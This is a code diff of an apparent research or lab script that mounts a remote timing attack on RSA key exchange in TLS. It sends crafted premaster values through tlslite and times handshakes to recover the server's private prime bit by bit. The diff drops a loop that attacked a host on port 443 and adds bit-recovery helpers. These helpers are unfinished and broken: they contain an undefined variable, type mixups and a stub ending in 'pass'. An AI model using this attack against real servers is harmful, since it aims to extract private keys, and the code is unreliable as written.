@@ -1,9 +1,8 @@
-import argparse
-import gc
 import socket
 import tlslite
 import rdtsc
 import sympy
+import sample
 
 
 from tlslite.handshakesettings import HandshakeSettings
@@ -18,7 +17,7 @@ class RSAKeyExchangeAttack(tlslite.keyexchange.RSAKeyExchange):
 
     def processServerKeyExchange(self, srvPublicKey, serverKeyExchange):
         """Generate premaster secret for server"""
-        g_bytes = self.g.to_bytes(length=128, byteorder="big")
+        g_bytes = sympy_integer_to_bytes(self.g)
         self.encPremasterSecret = g_bytes
         return g_bytes
 
@@ -147,27 +146,82 @@ class AttackTLSConnection(tlslite.TLSConnection):
             return start_time, end_time
 
 
+def sympy_integer_to_bits(integer, byteorder="big"):
+    bits = []
+
+    reduced = integer
+    while reduced > 0:
+        bits.append(reduced % 2)
+        reduced = reduced // 2
+
+    if byteorder == "big":
+        bits.reverse()
+
+    return bits
+
+
+def sympy_integer_to_bytes(integer, byteorder="big"):
+    bys = []
+
+    reduced = integer
+    while reduced > 0:
+        bys.append(reduced % 256)
+        reduced = reduced // 256
+
+    if byteorder == "big":
+        bys.reverse()
+
+    return bys
+
+
+def bits_to_sympy_integer(bits, byteorder="big"):
+    num_bits = len(bits)
+
+    integer = sympy.Integer(0)
+
+    for index, bit in enumerate(bits):
+        if byteorder == "big":
+            power = num_bits - index - 1
+        elif byteorder == "little":
+            power = index
+        else:
+            raise Exception()
+
+        integer += bit * 2 ** power
+
+    return integer
+
+
+def bruteforce_most_significant_bits():
+    gs = []
+    for h in (0, 1):
+        for i in (0, 1):
+            for j in (0, 1):
+                for k in (0, 1):
+                    g = bits_to_sympy_integer([h, i, j, k] + [0] * 509)
+                    gs.append(g)
+
+    sample.sample(gs, 5000)
+
+
+def recover_bit(known_q_bits, total_bits, N):
+    i = len(known_q_bits) + 1
+
+    num_bits_left = total_bits - (i + 1)
+    g_bits = known_q_bits + bytearray([0] * num_bits_left)
+
+    g_high_bits = g_bits
+    g_high_bits[i] = 1
+
+    g = bits_to_sympy_integer(g_bits)
+    g_high = bits_to_sympy_integer(g_high)
+
+    # if q[i] == 1 then: g < g_high < q
+    # else:              g < q < g_high
+    R = sympy.Integer(2) ** 512
+    u_g = (g * R ** (-1)) % N
+    pass
+
+
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument("start", type=int, default=1)
-    parser.add_argument("end", type=int, default=100)
-    parser.add_argument("step", type=int, default=1)
-    parser.add_argument("iterations", type=int, default=100)
-    args = parser.parse_args()
-
-    gc.disable()
-    gc.collect()
-
-    for index in range(args.start, args.end + 1, args.step):
-        for iteration in range(args.iterations):
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect(("antelope", 443))
-
-            connection = AttackTLSConnection(sock)
-            start_time, end_time = connection.performHandshakeAttack(index)
-            print(index, iteration, start_time, end_time, end_time - start_time)
-
-            connection.close()
-            sock.close()
-
-            gc.collect()
+    bruteforce_most_significant_bits()
